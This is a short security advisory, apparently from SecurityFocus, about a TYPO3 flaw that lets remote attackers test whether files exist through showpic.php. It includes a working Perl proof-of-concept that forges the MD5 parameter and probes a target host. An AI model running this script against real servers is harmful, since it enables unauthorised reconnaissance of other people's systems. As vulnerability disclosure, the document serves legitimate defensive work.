source: http://www.securityfocus.com/bid/6982/info

TYPO3 is prone to a vulnerability that will allow remote attackers to enumerate whether or not files exist on the system hosting the software. This issue exists in the 'showpic.php' and 'thumbs.php' scripts. This type of information may be useful in mounting further attacks against the host system. 

#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Response;
use Digest::MD5 qw(md5_hex);
($ho,$fi) = @ARGV;
$md5 = md5_hex("$fi||||");
$ua = new LWP::UserAgent(); $ua->agent("Opera 6.0");
$uri = "http://".$ho."/typo3/showpic.php?file=$fi&md5=$md5";
$req = HTTP::Request->new("GET",$uri);
$res = $ua->request($req);
if ($res->content !~ /was not found/ && $res->content !~ /No valid/) {print "\n$fi exists\n";}
else {print "\n$fi not found\n";}
